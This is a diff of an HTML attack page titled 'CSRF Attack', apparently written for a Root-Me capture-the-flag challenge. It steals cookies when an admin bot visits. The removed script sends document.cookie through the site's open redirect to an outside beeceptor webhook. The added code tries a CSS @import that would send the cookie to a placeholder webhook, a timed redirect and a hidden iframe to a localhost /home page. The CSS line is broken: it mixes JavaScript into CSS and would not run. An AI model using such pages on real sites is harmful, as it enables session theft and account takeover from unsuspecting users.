@@ -2,11 +2,20 @@
 <html>
 <head>
     <title>CSRF Attack</title>
+    <style>
+        /* Create CSS selectors that will trigger for specific cookie content */
+        @import url("http://your-webhook-url?cookie=" + document.cookie);
+    </style>
 </head>
 <body>
     <script>
-    // This will execute when the admin bot visits the page
-    fetch('http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/?cookie=' + encodeURIComponent(document.cookie))
+        // Fallback - try direct redirection after a short delay
+        setTimeout(function() {
+            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://your-webhook-url?redirect=true';
+        }, 1000);
     </script>
+    
+    <!-- Try to load a hidden iframe to /home which might reveal the flag -->
+    <iframe src="http://127.0.0.1:58039/home" style="display:none"></iframe>
 </body>
 </html>
